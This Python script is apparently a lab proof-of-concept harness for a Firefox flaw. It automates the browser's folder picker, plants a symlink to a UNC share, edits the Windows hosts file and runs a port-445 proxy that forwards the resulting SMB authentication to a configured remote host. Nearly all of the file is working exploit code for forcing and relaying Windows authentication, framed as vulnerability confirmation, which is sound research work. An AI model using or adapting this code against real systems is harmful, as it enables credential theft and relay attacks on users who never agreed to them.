from __future__ import annotations

import http.server
import json
import os
import shutil
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import traceback
from pathlib import Path

import psutil
import requests
from pywinauto import Desktop, keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

ROOT=Path(__file__).resolve().parent
CONFIG=json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
OUT=Path(os.environ.get("LAB_VICTIM_OUT",CONFIG.get("victim_out","victim-smb-out"))).resolve()
OUT.mkdir(parents=True,exist_ok=True)
FIREFOX=CONFIG["firefox_binary"]
BASE=Path(tempfile.gettempdir())/f"firefox-smb-relay-{CONFIG['run_id']}"
SELECTED=BASE/"selected"


def save(name,value):
    (OUT/name).write_text(json.dumps(value,indent=2,default=str),encoding="utf-8")


def run(args,timeout=60):
    return subprocess.run(args,text=True,capture_output=True,timeout=timeout)


class Proxy:
    def __init__(self,remote_host,remote_port):
        self.remote_host=remote_host; self.remote_port=int(remote_port)
        self.events=[]; self.ready=threading.Event(); self.stop_event=threading.Event()
        self.thread=threading.Thread(target=self.serve,daemon=True)
    def event(self,**value):
        value["time"]=time.time(); self.events.append(value); save("proxy-events.json",self.events)
    def pump(self,a,b,label):
        total=0
        try:
            while not self.stop_event.is_set():
                data=a.recv(65536)
                if not data: break
                total+=len(data); b.sendall(data)
        except Exception as exc: self.event(event="pump-error",label=label,error=repr(exc))
        finally:
            self.event(event="pump-finished",label=label,bytes=total)
            try: b.shutdown(socket.SHUT_WR)
            except Exception: pass
    def handle(self,client,address):
        self.event(event="accepted",address=address)
        try:
            remote=socket.create_connection((self.remote_host,self.remote_port),timeout=30)
            self.event(event="remote-connected",remote_host=self.remote_host,remote_port=self.remote_port)
            one=threading.Thread(target=self.pump,args=(client,remote,"windows-to-tunnel"),daemon=True)
            two=threading.Thread(target=self.pump,args=(remote,client,"tunnel-to-windows"),daemon=True)
            one.start(); two.start(); one.join(120); two.join(120)
            remote.close()
        except Exception as exc: self.event(event="connection-error",error=repr(exc))
        finally: client.close()
    def serve(self):
        server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        try:
            server.bind(("127.77.77.77",445)); server.listen(16); server.settimeout(.5)
            self.event(event="listening",host="127.77.77.77",port=445); self.ready.set()
            while not self.stop_event.is_set():
                try: client,address=server.accept()
                except socket.timeout: continue
                threading.Thread(target=self.handle,args=(client,address),daemon=True).start()
        except Exception as exc:
            self.event(event="server-error",error=repr(exc)); self.ready.set()
        finally: server.close()
    def start(self):
        self.thread.start(); self.ready.wait(10)
        if not any(x.get("event")=="listening" for x in self.events):
            raise RuntimeError(f"local SMB proxy did not bind: {self.events}")
    def stop(self): self.stop_event.set()


def start_http():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self,*args): pass
    factory=lambda *args,**kwargs:Handler(*args,directory=str(ROOT),**kwargs)
    server=socketserver.TCPServer(("127.0.0.1",0),factory)
    threading.Thread(target=server.serve_forever,daemon=True).start()
    return server,int(server.server_address[1])


def windows():
    try: return Desktop(backend="uia").windows()
    except Exception: return []


def click_buttons(result):
    for window in windows():
        for caption in ("Upload","Allow","OK","Open","Select Folder","Choose Folder"):
            try:
                button=window.child_window(title_re=rf"(?i)^{caption}$",control_type="Button")
                if button.exists(timeout=.05) and button.is_enabled():
                    button.click(); result.setdefault("buttons",[]).append(caption)
            except Exception: pass


def select_folder(driver,path):
    result={"started":time.time()}; driver.find_element(By.ID,"picker").click()
    dialog=None; end=time.time()+25
    while time.time()<end and dialog is None:
        for window in windows():
            title=(window.window_text() or "").lower()
            if any(word in title for word in ("file upload","select folder","choose folder","upload")):
                dialog=window; break
        time.sleep(.2)
    if dialog is None: result["error"]="native picker not found"; return result
    result["dialog_title"]=dialog.window_text(); dialog.set_focus()
    try:
        keyboard.send_keys("^l"); time.sleep(.4)
        keyboard.send_keys(str(path),with_spaces=True); keyboard.send_keys("{ENTER}"); time.sleep(1)
        clicked=False
        for caption in ("Select Folder","Choose Folder","Open","Select"):
            try:
                button=dialog.child_window(title_re=rf"(?i)^{caption}$",control_type="Button")
                if button.exists(timeout=.3) and button.is_enabled():
                    button.click(); result["picker_button"]=caption; clicked=True; break
            except Exception: pass
        if not clicked: keyboard.send_keys("{ENTER}"); result["picker_button"]="ENTER"
    except Exception as exc: result["interaction_error"]=repr(exc)
    end=time.time()+30
    while time.time()<end:
        try:
            phase=driver.execute_script("return window.relayLab && window.relayLab.phase")
            if phase in ("selected","no-root"):
                result["page_phase"]=phase; result["finished"]=time.time(); return result
        except Exception: pass
        click_buttons(result); time.sleep(.25)
    result["page_phase"]="timeout"; result["finished"]=time.time(); return result


def firefox_snapshot():
    rows=[]
    for process in psutil.process_iter(["pid","ppid","name","exe","cmdline","create_time"]):
        try:
            if (process.info.get("name") or "").lower()=="firefox.exe": rows.append(process.info)
        except Exception: pass
    return rows


def start_procmon():
    result={"started":False}
    try:
        archive=OUT/"ProcessMonitor.zip"
        response=requests.get("https://download.sysinternals.com/files/ProcessMonitor.zip",timeout=60)
        response.raise_for_status(); archive.write_bytes(response.content)
        tools=OUT/"procmon"; tools.mkdir(exist_ok=True)
        import zipfile
        with zipfile.ZipFile(archive) as zf: zf.extractall(tools)
        exe=tools/"Procmon64.exe"; pml=OUT/"trace.pml"
        process=subprocess.Popen([str(exe),"/AcceptEula","/Quiet","/Minimized","/BackingFile",str(pml)],
                                 stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        time.sleep(3); result.update(started=True,exe=str(exe),pml=str(pml),launcher_pid=process.pid)
    except Exception as exc: result["error"]=repr(exc)
    return result


def stop_procmon(state):
    if not state.get("started"): return state
    try:
        subprocess.run([state["exe"],"/Terminate"],capture_output=True,timeout=30); time.sleep(2)
        csv_path=OUT/"trace.csv"
        subprocess.run([state["exe"],"/AcceptEula","/Quiet","/OpenLog",state["pml"],"/SaveAs",str(csv_path)],
                       capture_output=True,timeout=120)
        state["csv_exists"]=csv_path.exists(); state["csv"]=str(csv_path)
        matches=[]
        if csv_path.exists():
            for line in csv_path.read_text(errors="replace").splitlines():
                lower=line.lower()
                if "firefox.exe" in lower and ("smb-link" in lower or "probe.txt" in lower):
                    matches.append(line[:3000])
                    if len(matches)>=200: break
        state["firefox_path_events"]=matches
    except Exception as exc: state["stop_error"]=repr(exc)
    return state


def main():
    result={"run_id":CONFIG["run_id"],"nonce":CONFIG["nonce"],"started":time.time(),
            "verdict":"NOT_CONFIRMED","network_identity":CONFIG.get("network_identity")}
    driver=httpd=None; proxy=None; procmon={"started":False}
    try:
        shutil.rmtree(BASE,ignore_errors=True); SELECTED.mkdir(parents=True)
        (SELECTED/"inside.txt").write_text("INSIDE_ONLY")
        proxy=Proxy(CONFIG["smb"]["host"],CONFIG["smb"]["port"]); proxy.start()
        hosts=Path(os.environ.get("SystemRoot",r"C:\Windows"))/"System32/drivers/etc/hosts"
        with hosts.open("a",encoding="ascii") as stream: stream.write("\n127.77.77.77 ffrelay-lab\n")
        result["hosts_entry"]="127.77.77.77 ffrelay-lab"
        httpd,port=start_http(); result["page_port"]=port
        options=Options(); options.binary_location=FIREFOX
        for key,value in {"dom.webkitBlink.filesystem.enabled":True,"dom.webkitBlink.dirPicker.enabled":True,
                          "browser.shell.checkDefaultBrowser":False,"datareporting.policy.dataSubmissionEnabled":False,
                          "browser.startup.homepage_override.mstone":"ignore"}.items(): options.set_preference(key,value)
        driver=webdriver.Firefox(options=options); result["capabilities"]=dict(driver.capabilities)
        result["parent_pid"]=int(driver.capabilities.get("moz:processID") or 0)
        driver.get(f"http://127.0.0.1:{port}/index.html"); time.sleep(1)
        result["picker"]=select_folder(driver,SELECTED)
        result["page_after_picker"]=driver.execute_script("return window.relayLab")
        result["firefox_before_link"]=firefox_snapshot()
        link=SELECTED/"smb-link"
        process=run(["cmd.exe","/d","/c","mklink","/D",str(link),r"\\ffrelay-lab\SHARE"])
        result["link"]={"path":str(link),"target":r"\\ffrelay-lab\SHARE","returncode":process.returncode,
                        "stdout":process.stdout,"stderr":process.stderr,"lexists":os.path.lexists(link),
                        "created_at":time.time()}
        procmon=start_procmon(); result["trigger_started"]=time.time()
        driver.set_script_timeout(30)
        try:
            result["browser_call"]=driver.execute_async_script(
                "const done=arguments[arguments.length-1]; window.triggerRelayPath('smb-link/probe.txt').then(done,e=>done({stage:'promise-error',error:String(e)}));")
        except Exception as exc: result["browser_call"]={"stage":"webdriver-error","error":repr(exc)}
        result["trigger_finished"]=time.time(); time.sleep(20)
        result["proxy_events"]=list(proxy.events); result["firefox_after_trigger"]=firefox_snapshot()
        try: result["page_final"]=driver.execute_script("return window.relayLab")
        except Exception as exc: result["page_final_error"]=repr(exc)
        try: driver.save_screenshot(str(OUT/"firefox.png"))
        except Exception as exc: result["screenshot_error"]=repr(exc)
        procmon=stop_procmon(procmon); result["procmon"]=procmon
        result["proof_conditions"]={
            "real_firefox":str((result.get("capabilities") or {}).get("browserName","")).lower()=="firefox",
            "native_picker_selected":(result.get("picker") or {}).get("page_phase")=="selected",
            "link_created_after_picker":int((result.get("link") or {}).get("returncode",1))==0 and bool((result.get("link") or {}).get("lexists")),
            "explicit_api_call":bool(result.get("browser_call")),
            "proxy_accepted_during_trigger":any(event.get("event")=="accepted" and event.get("time",0)>=result.get("trigger_started",0) for event in proxy.events),
            "firefox_file_operation_attribution":bool((procmon.get("firefox_path_events") or [])),
        }
        result["verdict"]="FIREFOX_SMB_AUTH_FLOW_TRIGGERED" if all(result["proof_conditions"].values()) else "FIREFOX_TRIGGER_INCOMPLETE"
    except Exception as exc:
        result.update(verdict="LAB_ERROR",error=repr(exc),traceback=traceback.format_exc())
    finally:
        result["finished"]=time.time(); save("victim-smb-result.json",result)
        try:
            if proxy: proxy.stop()
        except Exception: pass
        try:
            if driver: driver.quit()
        except Exception: pass
        try:
            if httpd: httpd.shutdown()
        except Exception: pass
    return 0

if __name__=="__main__": raise SystemExit(main())
